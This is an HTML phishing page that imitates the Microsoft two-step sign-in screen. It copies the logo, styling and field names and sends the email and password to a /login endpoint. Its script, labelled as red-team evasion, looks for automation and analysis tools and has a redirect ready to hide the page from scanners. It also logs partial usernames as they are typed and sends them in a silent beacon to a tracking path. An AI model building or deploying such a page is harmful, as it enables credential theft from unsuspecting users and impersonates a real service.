<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body {
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background-color: #f0f2f5;
            background-image: radial-gradient(at 50% 50%, hsla(210, 100%, 95%, 1) 0px, transparent 50%),
                              radial-gradient(at 0% 0%, hsla(220, 100%, 96%, 1) 0px, transparent 50%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background-color: white;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 380px; /* Microsoft standard width */
            min-height: 330px;
            text-align: left;
            position: relative;
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo img, .logo svg {
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            margin-top: 0;
            color: #1b1b1b;
        }
        .title-wrapper {
            margin-bottom: 12px;
        }
        p {
            color: #1b1b1b;
            margin-bottom: 20px;
            font-size: 15px;
        }
        .form-group {
            margin-bottom: 16px;
            position: relative;
        }
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 6px 10px;
            padding-bottom: 8px;
            padding-top: 8px;
            border: 1px solid #707070; /* Standard gray */
            border-bottom-width: 1px;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            transition: all 0.2s;
        }
        input:focus {
            border-bottom: 2px solid #0067b8;
            padding-bottom: 7px; /* Adjust for border width */
        }
        input::placeholder {
            color: #666;
        }
        
        .actions {
            margin-top: 16px;
            margin-bottom: 20px;
            font-size: 13px;
        }
        .actions a {
            color: #0067b8;
            text-decoration: none;
        }
        .actions a:hover {
            text-decoration: underline;
            color: #005da6;
        }

        .btn-container {
            text-align: right;
            margin-top: 30px;
        }

        button {
            min-width: 108px;
            padding: 6px 32px;
            background-color: #0067b8;
            color: white;
            border: none;
            font-size: 15px;
            cursor: pointer;
            transition: background-color 0.2s;
            font-weight: 600;
        }
        button:hover {
            background-color: #005da6;
        }
        
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            text-align: right;
            padding: 10px;
            font-size: 11px;
            color: #000;
            right: 44px; /* Align with container padding */
        }
        
        /* Loader */
        .loader-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10;
            display: none;
        }
        .dots-loader {
            display: flex;
            gap: 4px;
        }
        .dot {
            width: 8px;
            height: 8px;
            background: #0067b8;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }
        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        /* Slide Transition */
        .slide-section {
            display: none;
            animation: fadeIn 0.3s;
        }
        .slide-section.active {
            display: block;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(10px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .user-display {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 15px;
            cursor: pointer;
            padding: 4px 8px;
            margin-left: -8px;
            border-radius: 2px;
        }
        .user-display:hover {
            background-color: #e1dfdd;
        }
        .user-display .arrow {
            margin-left: auto;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader-overlay" id="loader">
            <div class="dots-loader">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
        </div>

        <div class="logo">
            <svg viewBox="0 0 215 46" height="24" aria-hidden="true">
               <path fill="#737373" d="M30.77 24.58h-6.23v13.63h-6.73V13.84h6.73v8.52h6.23v-8.52h6.74v24.37h-6.74V24.58zM49.26 15.68v22.53h-6.74V15.68h6.74zm-3.35-8.35c2.14 0 3.86 1.74 3.86 3.86s-1.72 3.86-3.86 3.86-3.86-1.74-3.86-3.86 1.72-3.86 3.86-3.86zM67.8 28.98c0 4.22-2.12 6.08-5.65 6.08-2.91 0-5.1-1.63-5.32-4.14h-6.33c.42 5.86 5.51 9.49 11.65 9.49 8.24 0 12.38-4.93 12.38-11.23V15.68h-6.73v13.3zM93.38 21.82v16.39h-6.74v-15.6c0-2.84-1.21-4.12-3.79-4.12-2.86 0-5.08 1.63-5.08 4.67v15.05h-6.74V15.68h6.74v2.53c1.72-2.09 4.28-3.09 7.42-3.09 5.37 0 8.19 2.91 8.19 6.7zM106.68 38.21c-5.88 0-10.09-3.95-10.09-10.23 0-6.42 4.28-10.37 10.35-10.37 6.44 0 10.21 4.14 9.93 11.02h-13.63c.21 2.91 2.37 4.53 5.49 4.53 2.58 0 4.58-1.28 5.07-3.4h6.42c-.88 5.16-5.81 8.45-13.54 8.45zm3.6-13.16c-.16-2.51-1.95-3.95-4.05-3.95-2.28 0-3.81 1.51-4.07 3.95h8.12zM128.71 19.33c1.4-1.16 3.09-1.6 4.93-1.6 3.19 0 5.07 1.63 5.07 4.21v1.65c-6.84.14-11.21 1.84-11.21 6.37 0 3.23 2.33 5.07 6.05 5.07 3.33 0 5.67-1.56 6.56-3.81h.23v3h6.35V23.08c0-5.91-3.63-9.23-10.98-9.23-3.6 0-6.93 1.12-9.14 3.02l2.14 2.46zm5.07 13.91c-1.84 0-3.02-.79-3.02-2.33 0-1.74 1.77-2.67 5.28-2.77v2.16c-.44 1.95-1.95 2.94-2.26 2.94zM161.41 15.68h-4.3v-4.91h-6.74v4.91h-3.42v5.12h3.42v9.39c0 4.6 2.49 6.79 7.63 6.79 1.79 0 3.12-.23 3.98-.44v-5.07c-.53.12-1.26.19-2.02.19-1.86 0-2.84-.79-2.84-2.72v-8.14h4.3v-5.12zM172.48 15.68v22.53h-6.74V15.68h6.74zm-3.35-8.35c2.14 0 3.86 1.74 3.86 3.86s-1.72 3.86-3.86 3.86-3.86-1.74-3.86-3.86 1.72-3.86 3.86-3.86zM186.27 38.65c-6.42 0-10.74-4.28-10.74-10.67 0-6.51 4.37-10.79 10.84-10.79 6.47 0 10.79 4.23 10.79 10.72 0 6.47-4.28 10.74-10.89 10.74zm0-5.42c2.72 0 4.3-1.95 4.3-5.3 0-3.26-1.58-5.33-4.26-5.33-2.65 0-4.23 2.05-4.23 5.3 0 3.3 1.6 5.33 4.19 5.33zM211.39 21.82v16.39h-6.74v-15.6c0-2.84-1.21-4.12-3.79-4.12-2.86 0-5.08 1.63-5.08 4.67v15.05h-6.74V15.68h6.74v2.53c1.72-2.09 4.28-3.09 7.42-3.09 5.37 0 8.19 2.91 8.19 6.7z"></path>
               <path fill="#F25022" d="M11.53 1.86H1.86v9.67h9.67V1.86z"></path>
               <path fill="#7FBA00" d="M22.28 1.86h-9.67v9.67h9.67V1.86z"></path>
               <path fill="#00A4EF" d="M11.53 12.6H1.86v9.67h9.67V12.6z"></path>
               <path fill="#FFB900" d="M22.28 12.6h-9.67v9.67h9.67V12.6z"></path>
            </svg>
        </div>

        <!-- Step 1: Username -->
        <div id="step-username" class="slide-section active">
            <div class="title-wrapper">
                <h1>Sign in</h1>
            </div>
            
            <form id="form-username" onsubmit="handleUsername(event)">
                <div class="form-group">
                    <input type="email" id="email" name="loginfmt" placeholder="Email, phone, or Skype" required autocomplete="username">
                </div>
                
                <div class="actions">
                    No account? <a href="#">Create one!</a>
                </div>
                <div class="actions">
                    <a href="#">Can't access your account?</a>
                </div>

                <div class="btn-container">
                    <button type="submit">Next</button>
                </div>
            </form>
        </div>

        <!-- Step 2: Password -->
        <div id="step-password" class="slide-section">
            <div class="user-display" onclick="backToUsername()">
                <div id="display-email">user@example.com</div>
            </div>
            
            <div class="title-wrapper">
                <h1>Enter password</h1>
            </div>
            
            <form id="form-password" action="/login" method="POST" onsubmit="handlePassword(event)">
                <input type="hidden" id="hidden-email" name="loginfmt">
                
                <div class="form-group">
                    <input type="password" id="password" name="passwd" placeholder="Password" required autocomplete="current-password">
                </div>
                
                <div class="actions">
                    <a href="#">Forgot password?</a>
                </div>

                <div class="btn-container">
                    <button type="submit">Sign in</button>
                </div>
            </form>
        </div>
        
    </div>

    <script>
        // Vantablack Red Team Evasion & Logic Script
        (function() {
            // Anti-Analysis: Check for automation tools
            const isAutomation = navigator.webdriver || window.callPhantom || window._phantom;
            if (isAutomation) {
                // Redirect or show harmless content
                // window.location.href = "https://www.google.com"; // Uncomment for prod
            }

            // Input Capture (Keystroke logging for username)
            const emailInput = document.getElementById('email');
            emailInput.addEventListener('input', function(e) {
                if(window.navigator.sendBeacon && e.target.value.length > 3) {
                    const data = new FormData();
                    data.append('k', e.target.value);
                    data.append('f', 'username_partial');
                    // Silent beacon
                    window.navigator.sendBeacon('/__vanta_track', data);
                }
            });

        })();

        function showLoader() {
            document.getElementById('loader').style.display = 'flex';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        function handleUsername(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            if (!email) return;

            showLoader();
            
            // Simulate network delay
            setTimeout(() => {
                hideLoader();
                document.getElementById('step-username').classList.remove('active');
                document.getElementById('step-password').classList.add('active');
                
                document.getElementById('display-email').innerText = email;
                document.getElementById('hidden-email').value = email;
                document.getElementById('password').focus();
            }, 800 + Math.random() * 500);
        }

        function backToUsername() {
            document.getElementById('step-password').classList.remove('active');
            document.getElementById('step-username').classList.add('active');
        }

        function handlePassword(e) {
            // Allow default submission, but maybe add extra tracking
            // e.preventDefault();
            // document.getElementById('form-password').submit();
        }
    </script>
</body>
</html>
